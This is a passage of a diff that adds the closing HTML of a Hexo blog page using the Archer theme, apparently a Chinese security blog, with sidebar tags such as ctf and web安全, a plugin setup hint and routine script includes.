+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/posts/41083/">sql注入大全</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Tianji"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
